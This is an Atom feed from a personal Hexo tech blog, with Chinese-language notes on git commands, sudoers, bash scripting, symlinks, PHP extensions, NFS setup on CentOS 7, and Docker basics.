<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Live with love]]></title>
  <subtitle><![CDATA[Live with love]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2016-06-26T13:04:36.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[践行]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[Git命令学习]]></title>
    <link href="http://yoursite.com/2016/06/26/Git%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2016/06/26/Git命令学习/</id>
    <published>2016-06-26T04:11:58.000Z</published>
    <updated>2016-06-26T13:04:36.000Z</updated>
    <content type="html"><![CDATA[<h3 id="Git_u8FDC_u7A0B_u64CD_u4F5C_u8BE6_u89E3"><a href="#Git_u8FDC_u7A0B_u64CD_u4F5C_u8BE6_u89E3" class="headerlink" title="Git远程操作详解"></a><a href="http://www.ruanyifeng.com/blog/2014/06/git_remote.html" target="_blank" rel="external">Git远程操作详解</a></h3><p>涉及命令:</p>
<ul>
<li>git clone</li>
<li>git remote</li>
<li>git fetch</li>
<li>git pull</li>
<li>git push</li>
</ul>
<h4 id="git_branch_u547D_u4EE4_u7684-r_u9009_u9879_uFF0C_u53EF_u4EE5_u7528_u6765_u67E5_u770B_u8FDC_u7A0B_u5206_u652F_uFF0C-a_u9009_u9879_u67E5_u770B_u6240_u6709_u5206_u652F_u3002"><a href="#git_branch_u547D_u4EE4_u7684-r_u9009_u9879_uFF0C_u53EF_u4EE5_u7528_u6765_u67E5_u770B_u8FDC_u7A0B_u5206_u652F_uFF0C-a_u9009_u9879_u67E5_u770B_u6240_u6709_u5206_u652F_u3002" class="headerlink" title="git branch命令的-r选项，可以用来查看远程分支，-a选项查看所有分支。"></a>git branch命令的-r选项，可以用来查看远程分支，-a选项查看所有分支。</h4><pre><code>$ git branch -r
origin/master

$ git branch -a
* master
  remotes/origin/master
</code></pre><h4 id="u53D6_u56DE_u8FDC_u7A0B_u4E3B_u673A_u7684_u66F4_u65B0_u4EE5_u540E_uFF0C_u53EF_u4EE5_u5728_u5B83_u7684_u57FA_u7840_u4E0A_uFF0C_u4F7F_u7528git_checkout_u547D_u4EE4_u521B_u5EFA_u4E00_u4E2A_u65B0_u7684_u5206_u652F_u3002"><a href="#u53D6_u56DE_u8FDC_u7A0B_u4E3B_u673A_u7684_u66F4_u65B0_u4EE5_u540E_uFF0C_u53EF_u4EE5_u5728_u5B83_u7684_u57FA_u7840_u4E0A_uFF0C_u4F7F_u7528git_checkout_u547D_u4EE4_u521B_u5EFA_u4E00_u4E2A_u65B0_u7684_u5206_u652F_u3002" class="headerlink" title="取回远程主机的更新以后，可以在它的基础上，使用git checkout命令创建一个新的分支。"></a>取回远程主机的更新以后，可以在它的基础上，使用git checkout命令创建一个新的分支。</h4><pre><code>$ git checkout -b newBrach origin/master
</code></pre><h4 id="u6B64_u5916_uFF0C_u4E5F_u53EF_u4EE5_u4F7F_u7528git_merge_u547D_u4EE4_u6216_u8005git_rebase_u547D_u4EE4_uFF0C_u5728_u672C_u5730_u5206_u652F_u4E0A_u5408_u5E76_u8FDC_u7A0B_u5206_u652F_u3002"><a href="#u6B64_u5916_uFF0C_u4E5F_u53EF_u4EE5_u4F7F_u7528git_merge_u547D_u4EE4_u6216_u8005git_rebase_u547D_u4EE4_uFF0C_u5728_u672C_u5730_u5206_u652F_u4E0A_u5408_u5E76_u8FDC_u7A0B_u5206_u652F_u3002" class="headerlink" title="此外，也可以使用git merge命令或者git rebase命令，在本地分支上合并远程分支。"></a>此外，也可以使用git merge命令或者git rebase命令，在本地分支上合并远程分支。</h4><pre><code>$ git merge origin/master
# 或者
$ git rebase origin/master
</code></pre><p>上面命令表示在当前分支上，合并origin/master。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="Git_u8FDC_u7A0B_u64CD_u4F5C_u8BE6_u89E3"><a href="#Git_u8FDC_u7A0B_u64CD_u4F5C_u8BE6_u89E3" class="headerlink" title="Git远程操作详解"></a]]>
    </summary>
    
      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Git代码冲突常见解决方法]]></title>
    <link href="http://yoursite.com/2016/06/25/Git%E4%BB%A3%E7%A0%81%E5%86%B2%E7%AA%81%E5%B8%B8%E8%A7%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>http://yoursite.com/2016/06/25/Git代码冲突常见解决方法/</id>
    <published>2016-06-25T04:08:13.000Z</published>
    <updated>2016-06-26T13:04:25.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5982_u679C_u540C_u4E00_u4E2A_u6587_u4EF6_2C__u8FDC_u7AEF_u505A_u4E86_u4FEE_u6539_2C__u672C_u5730_u4E5F_u505A_u4E86_u4FEE_u6539_2C__u8FD9_u65F6_u5019_u672C_u5730_u6267_u884C_git_pull__2C__u4F1A_u62A5_u9519_3A"><a href="#u5982_u679C_u540C_u4E00_u4E2A_u6587_u4EF6_2C__u8FDC_u7AEF_u505A_u4E86_u4FEE_u6539_2C__u672C_u5730_u4E5F_u505A_u4E86_u4FEE_u6539_2C__u8FD9_u65F6_u5019_u672C_u5730_u6267_u884C_git_pull__2C__u4F1A_u62A5_u9519_3A" class="headerlink" title="如果同一个文件, 远端做了修改, 本地也做了修改, 这时候本地执行 git pull  , 会报错:"></a>如果同一个文件, 远端做了修改, 本地也做了修改, 这时候本地执行 git pull  , 会报错:</h3><pre><code>Updating c1cddf2..78c0dc1
error: Your local changes to the following files would be overwritten by merge:
    conf/gitolite.conf
Please, commit your changes or stash them before you can merge.
Aborting
</code></pre><p>因为直接拉取远端的, 会覆盖本地的修改, 所以会报这个错.</p>
<p>如果希望保留生产服务器上所做的改动,仅仅并入新配置项, 处理方法如下:</p>
<pre><code>git stash  #把本地修改暂存
git pull    #拉取远端变更
git stash pop    # 将本地变更加入
</code></pre><p>然后可以使用git diff -w +文件名 来确认代码自动合并的情况.</p>
<p>反过来,如果希望用代码库中的文件完全覆盖本地工作版本. 方法如下:</p>
<pre><code>git reset --hard
git pull
</code></pre><p>其中git reset是针对版本,如果想针对文件回退本地修改,使用</p>
<pre><code>git checkout HEAD file/to/restore  
</code></pre><p>参考:</p>
<p><a href="http://blog.csdn.net/iefreer/article/details/7679631" target="_blank" rel="external">http://blog.csdn.net/iefreer/article/details/7679631</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5982_u679C_u540C_u4E00_u4E2A_u6587_u4EF6_2C__u8FDC_u7AEF_u505A_u4E86_u4FEE_u6539_2C__u672C_u5730_u4E5F_u505A_u4E86_u4FEE_u6539_2C__]]>
    </summary>
    
      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[设置普通用户sudo 免密码执行特定命令]]></title>
    <link href="http://yoursite.com/2016/06/21/%E8%AE%BE%E7%BD%AE%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7sudo-%E5%85%8D%E5%AF%86%E7%A0%81%E6%89%A7%E8%A1%8C%E7%89%B9%E5%AE%9A%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2016/06/21/设置普通用户sudo-免密码执行特定命令/</id>
    <published>2016-06-21T07:52:03.000Z</published>
    <updated>2016-06-21T07:55:25.000Z</updated>
    <content type="html"><![CDATA[<p>visudo</p>
<pre><code>joe ALL=(ALL) NOPASSWD: /full/path/to/command
</code></pre><p>参考:</p>
<p><a href="http://www.atrixnet.com/allow-an-unprivileged-user-to-run-a-certain-command-with-sudo/" target="_blank" rel="external">Allow An Unprivileged User To Run A Certain Command With Sudo</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>visudo</p>
<pre><code>joe ALL=(ALL) NOPASSWD: /full/path/to/command
</code></pre><p>参考:</p>
<p><a href="http://www.atrixnet.com/allow-an-]]>
    </summary>
    
      <category term="sudo" scheme="http://yoursite.com/tags/sudo/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[bash shell脚本犯错集锦]]></title>
    <link href="http://yoursite.com/2016/06/12/bash-shell%E8%84%9A%E6%9C%AC%E7%8A%AF%E9%94%99%E9%9B%86%E9%94%A6/"/>
    <id>http://yoursite.com/2016/06/12/bash-shell脚本犯错集锦/</id>
    <published>2016-06-12T08:48:27.000Z</published>
    <updated>2016-06-12T08:57:18.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u4E0B_u5212_u7EBF_u8FDE_u63A5_u53D8_u91CF"><a href="#u4E0B_u5212_u7EBF_u8FDE_u63A5_u53D8_u91CF" class="headerlink" title="下划线连接变量"></a>下划线连接变量</h3><p>有个数据库备份脚本</p>
<pre><code>DB=dbname

mysqldump -uroot -p $DB &gt; $DB_`date +%F`.sql
</code></pre><p>然后发现备份出来的文件名只有时间, 后来才知道shell 是把 <code>$DB_</code> 当成一个变量了, 然后前面 <code>$DB_</code> 又没赋值, 所以就是空. 正确的写法应该是: </p>
<pre><code>mysqldump -uroot -p $DB &gt; ${DB}_`date +%F`.sql
</code></pre><p>规范很重要, 以后不要偷懒</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u4E0B_u5212_u7EBF_u8FDE_u63A5_u53D8_u91CF"><a href="#u4E0B_u5212_u7EBF_u8FDE_u63A5_u53D8_u91CF" class="headerlink" title="下划线连接变量"><]]>
    </summary>
    
      <category term="error" scheme="http://yoursite.com/tags/error/"/>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Linux 命令]]></title>
    <link href="http://yoursite.com/2016/05/19/Linux-%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2016/05/19/Linux-命令/</id>
    <published>2016-05-19T09:09:36.000Z</published>
    <updated>2016-05-25T01:12:38.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u8F6F_u8FDE_u63A5"><a href="#u8F6F_u8FDE_u63A5" class="headerlink" title="软连接"></a>软连接</h3><h4 id="u521B_u5EFA"><a href="#u521B_u5EFA" class="headerlink" title="创建"></a>创建</h4><p>想把目录 /opt/www/v1.0.1 软连接到 /mnt/下面, 软链接后, 目录为 /mnt/v1.0.1</p>
<p>命令: </p>
<pre><code>ln -s /opt/www/v1.0.1/ /mnt/
</code></pre><p>这样会产生一个 <code>/mnt/v1.0.1 -&gt; /opt/www/v1.0.1/</code> 的软连接</p>
<p>又比如要创建一个特定名称的软连接目录, 比如 beta:</p>
<pre><code>ln -s /opt/www/branches/v1.1 /opt/www/beta
</code></pre><p>最后是这样的: <code>/opt/www/beta -&gt; /opt/www/branches/v1.1/</code></p>
<p>注意</p>
<ul>
<li>要用绝对路径, 用相对路径会报错: Too many levels of symbolic links</li>
<li>目录后面的斜杠 / 要带上</li>
</ul>
<h4 id="u5220_u9664"><a href="#u5220_u9664" class="headerlink" title="删除"></a>删除</h4><pre><code>rm -rf /mnt/v1.0.1
</code></pre><p>注意: 不是 <code>rm -rf /mnt/v1.0.1/</code>  这样会把真正内容删除的!</p>
<a id="more"></a>]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u8F6F_u8FDE_u63A5"><a href="#u8F6F_u8FDE_u63A5" class="headerlink" title="软连接"></a>软连接</h3><h4 id="u521B_u5EFA"><a href="#u521B_u5EFA" class="headerlink" title="创建"></a>创建</h4><p>想把目录 /opt/www/v1.0.1 软连接到 /mnt/下面, 软链接后, 目录为 /mnt/v1.0.1</p>
<p>命令: </p>
<pre><code>ln -s /opt/www/v1.0.1/ /mnt/
</code></pre><p>这样会产生一个 <code>/mnt/v1.0.1 -&gt; /opt/www/v1.0.1/</code> 的软连接</p>
<p>又比如要创建一个特定名称的软连接目录, 比如 beta:</p>
<pre><code>ln -s /opt/www/branches/v1.1 /opt/www/beta
</code></pre><p>最后是这样的: <code>/opt/www/beta -&gt; /opt/www/branches/v1.1/</code></p>
<p>注意</p>
<ul>
<li>要用绝对路径, 用相对路径会报错: Too many levels of symbolic links</li>
<li>目录后面的斜杠 / 要带上</li>
</ul>
<h4 id="u5220_u9664"><a href="#u5220_u9664" class="headerlink" title="删除"></a>删除</h4><pre><code>rm -rf /mnt/v1.0.1
</code></pre><p>注意: 不是 <code>rm -rf /mnt/v1.0.1/</code>  这样会把真正内容删除的!</p>]]>
    
    </summary>
    
      <category term="man" scheme="http://yoursite.com/tags/man/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[php 添加pcntl和 redis 支持]]></title>
    <link href="http://yoursite.com/2016/05/16/php-%E6%B7%BB%E5%8A%A0pcntl%E5%92%8C-redis-%E6%94%AF%E6%8C%81/"/>
    <id>http://yoursite.com/2016/05/16/php-添加pcntl和-redis-支持/</id>
    <published>2016-05-16T02:17:33.000Z</published>
    <updated>2016-05-16T03:47:59.000Z</updated>
    <content type="html"><![CDATA[<h3 id="pcntl"><a href="#pcntl" class="headerlink" title="pcntl"></a>pcntl</h3><p>进入同版本 php 源码:</p>
<pre><code>cd ext/pcntl
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>测试是否安装成功</p>
<pre><code>&lt;?php
echo pcntl_fork();
?&gt;
</code></pre><p>输出</p>
<pre><code>23165
</code></pre><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><pre><code>git clone https://github.com/phpredis/phpredis.git phpredis
cd phpredis
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>最后记得把扩展加入 php.ini , 重新加载配置生效</p>
<a id="more"></a>
<p>参考:</p>
<p><a href="http://www.cnblogs.com/fengwei/archive/2012/09/16/2687716.html" target="_blank" rel="external">php添加pcntl扩展 问题及解决方法</a></p>
<p><a href="https://blog.phpgao.com/redis_php.html#开启redis扩展" target="_blank" rel="external">Linux服务器配置Redis并启用PHP支持</a></p>
<p><a href="http://my.oschina.net/liuhuan0927/blog/616880" target="_blank" rel="external">PHP 支持 redis扩展</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="pcntl"><a href="#pcntl" class="headerlink" title="pcntl"></a>pcntl</h3><p>进入同版本 php 源码:</p>
<pre><code>cd ext/pcntl
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>测试是否安装成功</p>
<pre><code>&lt;?php
echo pcntl_fork();
?&gt;
</code></pre><p>输出</p>
<pre><code>23165
</code></pre><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><pre><code>git clone https://github.com/phpredis/phpredis.git phpredis
cd phpredis
/usr/local/php/bin/phpize
./configure --with-php-config=/usr/local/php/bin/php-config
make &amp;&amp; make install
</code></pre><p>最后记得把扩展加入 php.ini , 重新加载配置生效</p>]]>
    
    </summary>
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
      <category term="redis" scheme="http://yoursite.com/tags/redis/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos7 配置 NFS]]></title>
    <link href="http://yoursite.com/2016/05/12/Centos7-%E9%85%8D%E7%BD%AE-NFS/"/>
    <id>http://yoursite.com/2016/05/12/Centos7-配置-NFS/</id>
    <published>2016-05-12T08:35:09.000Z</published>
    <updated>2016-05-25T01:12:41.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><pre><code>yum -y install nfs-utils
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="配置"></a>配置</h3><p>nfs配置文件:</p>
<pre><code>cat /etc/exports
/data/backup/bid 10.45.46.144/24(rw,no_root_squash)    #允许挂载 NFS 的机器ip
</code></pre><p>服务自启动:</p>
<pre><code>systemctl start rpcbind nfs-server 
systemctl enable rpcbind nfs-server
</code></pre><p>nfs 启动后, 检查状态:</p>
<pre><code>exportfs -v
/data/backup/bid
10.45.46.144/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)
</code></pre><p>重新读取 nfs 配置文件:</p>
<pre><code>exportfs -rv
</code></pre><a id="more"></a>
<h3 id="u5BA2_u6237_u7AEF_u6302_u8F7D"><a href="#u5BA2_u6237_u7AEF_u6302_u8F7D" class="headerlink" title="客户端挂载"></a>客户端挂载</h3><pre><code>mount -t nfs nfs_server_ip:/data/backup/bid /mnt/
</code></pre><p>查看挂载</p>
<pre><code>df -Th
</code></pre><p>参考:</p>
<p>防火墙开放端口111和2049</p>
<p><a href="http://blog.dreamlu.net/blog/67" target="_blank" rel="external">http://blog.dreamlu.net/blog/67</a></p>
<p><a href="http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs" target="_blank" rel="external">http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs</a></p>
<p><a href="http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs&amp;f=2" target="_blank" rel="external">http://www.server-world.info/en/note?os=CentOS_7&amp;p=nfs&amp;f=2</a></p>
<p>挂载命令</p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><pre><code>yum -y install nfs-utils
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="配置"></a>配置</h3><p>nfs配置文件:</p>
<pre><code>cat /etc/exports
/data/backup/bid 10.45.46.144/24(rw,no_root_squash)    #允许挂载 NFS 的机器ip
</code></pre><p>服务自启动:</p>
<pre><code>systemctl start rpcbind nfs-server 
systemctl enable rpcbind nfs-server
</code></pre><p>nfs 启动后, 检查状态:</p>
<pre><code>exportfs -v
/data/backup/bid
10.45.46.144/24(rw,wdelay,no_root_squash,no_subtree_check,sec=sys,rw,secure,no_root_squash,no_all_squash)
</code></pre><p>重新读取 nfs 配置文件:</p>
<pre><code>exportfs -rv
</code></pre>]]>
    
    </summary>
    
      <category term="nfs" scheme="http://yoursite.com/tags/nfs/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[<<Docker从入门到实践>>读书笔记(一) 基础篇]]></title>
    <link href="http://yoursite.com/2016/05/11/Docker%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%AE%9E%E8%B7%B5-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2016/05/11/Docker从入门到实践-读书笔记/</id>
    <published>2016-05-11T07:41:10.000Z</published>
    <updated>2016-05-11T07:41:10.000Z</updated>
    <content type="html"><![CDATA[<hr>
<p>环境:</p>
<ul>
<li>Mac OS X 10.11</li>
<li>Ubuntu 14.04</li>
<li>Docker Tools安装</li>
</ul>
<p>记录一下 docker 的学习历程, 三大基础概念已经基本了解, 然后下一步有点迷茫, 虽然迷茫, 但是不能止步不前, 于是我决定先用最笨的方法, 按书上说的做一遍吧…, 虽然看起来都懂, 但是不做感觉不踏实啊 - -<br><a id="more"></a></p>
<h4 id="u521B_u5EFA_u955C_u50CF"><a href="#u521B_u5EFA_u955C_u50CF" class="headerlink" title="创建镜像"></a>创建镜像</h4><p>1 拉取现有镜像, 修改后 commit</p>
<p>2 Dockerfile创建</p>
<p>3 导入镜像创建</p>
<p>OpenVZ容器是一个轻量虚拟机，一个完整的操作系统环境，它的主要用途是充当虚拟私有服务器。而Docker的哲学是<em>每个容器运行一个应用进程</em></p>
<p><a href="http://chuansong.me/n/1119422" target="_blank" rel="external">openvz vs docker</a></p>
<h4 id="u5220_u9664_u955C_u50CF"><a href="#u5220_u9664_u955C_u50CF" class="headerlink" title="删除镜像"></a>删除镜像</h4><p>*注意：在删除镜像之前要先用 docker rm 删掉依赖于这个镜像的所有容器。</p>
<h4 id="u8FDB_u5165_u5BB9_u5668"><a href="#u8FDB_u5165_u5BB9_u5668" class="headerlink" title="进入容器"></a>进入容器</h4><p>attach(不推荐)</p>
<p>docker exec 是Docker內建的命令。下面示範如何使用該命令</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ sudo docker run -idt ubuntu</span><br><span class="line"><span class="number">243</span>c32535da7d142fb0e6df616a3c3ada0b8ab417937c853a9e1c251f499f550</span><br><span class="line">$ sudo docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</span><br><span class="line"><span class="number">243</span>c32535da7        ubuntu:latest       <span class="string">"/bin/bash"</span>         <span class="number">18</span> seconds ago      Up <span class="number">17</span> seconds                           nostalgic_hypatia</span><br><span class="line">$sudo docker exec -ti nostalgic_hypatia bash</span><br><span class="line">root@<span class="number">243</span>c32535da7:/<span class="preprocessor">#</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/jpetazzo/nsenter" target="_blank" rel="external">nsenter</a>  这个安装起来很蛋疼啊, 有了docker exec , 就不折腾 nsenter 了, 而且命令又臭又长</p>
<h4 id="u5BB9_u5668_u7684_u5BFC_u51FA_u5BFC_u5165"><a href="#u5BB9_u5668_u7684_u5BFC_u51FA_u5BFC_u5165" class="headerlink" title="容器的导出导入"></a>容器的导出导入</h4><p>导出</p>
<pre><code>docker export 7691a814370e &gt; ubuntu.tar
</code></pre><p>导入</p>
<pre><code>cat ubuntu.tar | docker import - test/buntu:v1.0
</code></pre><p>通过导入导出功能, 可以实现容器的迁移</p>
<p>思考: 通过docker import 导入产生的镜像和通过 docker load 文件导入的镜像有什么区别</p>
<p>Tips:</p>
<p>如何清理后台停止的容器？</p>
<p>可以使用 docker rm $(docker ps -a -q) 命令</p>
<p>如何退出一个镜像的bash，而不终止它？</p>
<p>按 Ctrl-p Ctrl-q。</p>
<p>退出容器时候自动删除?</p>
<p>使用 –rm 选项，例如 sudo docker run –rm -it ubuntu</p>
<h4 id="u4ED3_u5E93"><a href="#u4ED3_u5E93" class="headerlink" title="仓库"></a>仓库</h4><p>登陆</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">$ docker login</span><br><span class="line">Username: xeroth</span><br><span class="line">Password:</span><br><span class="line">Email: 123321@qq.com</span><br><span class="line"><span class="label">WARNING: </span>login credentials saved in /Users/cristaly7/.docker/config.json</span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>
<p>搜索镜像</p>
<pre><code>docker search centos

docker search -s 100 centos 显示100⭐️以上的镜像
</code></pre><p>⭐️自动创建(Automated Builds) </p>
<p>自动创建功能对于需要经常升级镜像内程序来说，十分方便。 有时候，用户创建了镜像，安装了某个软件，如果软件发布新版本则需要手动更新镜像<br>而自动创建允许用户通过 Docker Hub 指定跟踪一个目标网站（目前支持 GitHub 或 BitBucket）上的项目，一旦项目发生新的提交，则自动执行创建。</p>
<p>参考资料:<br><a href="https://docs.docker.com/docker-hub/builds/" target="_blank" rel="external">https://docs.docker.com/docker-hub/builds/</a><br><a href="https://www.brianchristner.io/how-to-automate-docker-builds-end-to-end/" target="_blank" rel="external">https://www.brianchristner.io/how-to-automate-docker-builds-end-to-end/</a></p>
<h5 id="dockerpool"><a href="#dockerpool" class="headerlink" title="dockerpool"></a>dockerpool</h5><p>dockerpool是国内的一个 docker 镜像资源网站</p>
<p>下载一个镜像试试</p>
<pre><code>docker pull dl.dockerpool.com:5000/ubuntu:12.04
</code></pre><p>报错:</p>
<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">docker pull dl.dockerpool.<span class="string">com:</span><span class="number">5000</span>/<span class="string">centos:</span><span class="number">7</span></span><br><span class="line">Error response from <span class="string">daemon:</span> unable to ping registry endpoint <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v0/</span></span><br><span class="line">v2 ping attempt failed with <span class="string">error:</span> Get <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v2/: tls: oversized record received with length 28012</span></span><br><span class="line"> v1 ping attempt failed with <span class="string">error:</span> Get <span class="string">https:</span><span class="comment">//dl.dockerpool.com:5000/v1/_ping: tls: oversized record received with length 28012</span></span><br></pre></td></tr></table></figure>
<p>解决方法:</p>
<p>查看虚拟机名字</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">docker-machine ls</span><br><span class="line"><span class="built_in">NAME</span>      ACTIVE   <span class="built_in">DRIVER</span>       STATE     URL                         SWARM   DOCKER   ERRORS</span><br><span class="line"><span class="keyword">default</span>   *        virtualbox   Running   tcp:<span class="comment">//192.168.99.100:2376           v1.9.1</span></span><br></pre></td></tr></table></figure>
<p>进入docker 虚拟机</p>
<pre><code>docker-machine ssh default
</code></pre><p>在default 虚拟机里修改 <em>/var/lib/boot2docker/profile</em> 文件, 在<strong>EXTRA_ARGS=</strong>里加入:<br><em>–insecure-registry dl.dockerpool.com:5000</em></p>
<p>重启 vm</p>
<pre><code>docker-machine restart default
</code></pre><p>再次运行docker pull dl.dockerpool.com:5000/ubuntu:12.04 就可以了</p>
<p>下载完成后:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">REPOSITORY                      TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">xeroth/sinatra                  v2                  <span class="number">1</span>a6a1230cfe3        <span class="number">3</span> days ago          <span class="number">319.4</span> MB</span><br><span class="line">ubuntu                          <span class="number">14.04</span>               af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">ubuntu                          latest              af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">nginx                           latest              <span class="number">813e3731</span>b203        <span class="number">3</span> weeks ago         <span class="number">133.9</span> MB</span><br><span class="line">hello-world                     latest              <span class="number">0</span>a6ba66e537a        <span class="number">3</span> months ago        <span class="number">960</span> B</span><br><span class="line">dl.dockerpool.com:<span class="number">5000</span>/ubuntu   <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br></pre></td></tr></table></figure>
<p>修改 tag</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ docker tag dl.dockerpool.com:<span class="number">5000</span>/ubuntu:<span class="number">12.04</span> ubuntu:<span class="number">12.04</span></span><br><span class="line">$ /Users/cristaly7 &gt;docker images</span><br><span class="line">REPOSITORY                      TAG                 IMAGE ID            CREATED             VIRTUAL SIZE</span><br><span class="line">xeroth/sinatra                  v2                  <span class="number">1</span>a6a1230cfe3        <span class="number">3</span> days ago          <span class="number">319.4</span> MB</span><br><span class="line">ubuntu                          <span class="number">14.04</span>               af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">ubuntu                          latest              af88597ec24b        <span class="number">8</span> days ago          <span class="number">187.9</span> MB</span><br><span class="line">nginx                           latest              <span class="number">813e3731</span>b203        <span class="number">3</span> weeks ago         <span class="number">133.9</span> MB</span><br><span class="line">hello-world                     latest              <span class="number">0</span>a6ba66e537a        <span class="number">3</span> months ago        <span class="number">960</span> B</span><br><span class="line">ubuntu                          <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br><span class="line">dl.dockerpool.com:<span class="number">5000</span>/ubuntu   <span class="number">12.04</span>               <span class="number">0</span>b310e6bf058        <span class="number">14</span> months ago       <span class="number">126.7</span> MB</span><br></pre></td></tr></table></figure>
<h5 id="u2B50_uFE0Fdocker__u955C_u50CF_u52A0_u901F_u7F51_u7AD9"><a href="#u2B50_uFE0Fdocker__u955C_u50CF_u52A0_u901F_u7F51_u7AD9" class="headerlink" title="⭐️docker 镜像加速网站"></a>⭐️docker 镜像加速网站</h5><p>发现了这个, 感觉 dockerpool 白弄了😂</p>
<p>国内的有 <a href="http://dockerpool.com/article/1419997003" target="_blank" rel="external">DaoCloud</a> 还有阿里的, 我此刻用的是阿里TAE2.0的<a href="http://tae.taobao.com/mirror/index.html?#/docker/speed/stat" target="_blank" rel="external">docker加速器</a></p>
<p>使用方法也很简单, 登陆阿里, 获取分配的镜像地址, 跟上面折腾 dockerpool 一样进入 vm, 修改文件<em>/var/lib/boot2docker/profile</em>, 在EXTRA_ARGS=里加入:<em>–registry-mirror=<a href="http://6tgwmnjm.mirror.aliyun.com" target="_blank" rel="external">http://6tgwmnjm.mirror.aliyun.com</a></em></p>
<p>真是飞一般的感觉啊! 妈妈再也不用担心我 docker 的上传下载了 , 谢谢 TAE</p>
<h5 id="u2B50_uFE0F_u79C1_u6709_u4ED3_u5E93"><a href="#u2B50_uFE0F_u79C1_u6709_u4ED3_u5E93" class="headerlink" title="⭐️私有仓库"></a>⭐️私有仓库</h5><p><a href="http://www.a-ho.com/2016/01/15/Docker私有仓库/" target="_blank" rel="external">搭建私有仓库</a>   </p>
<h4 id="u6570_u636E_u5377"><a href="#u6570_u636E_u5377" class="headerlink" title="数据卷"></a>数据卷</h4><p><a href="http://www.a-ho.com/2016/01/23/Docker数据卷/" target="_blank" rel="external">Docker 数据卷</a></p>
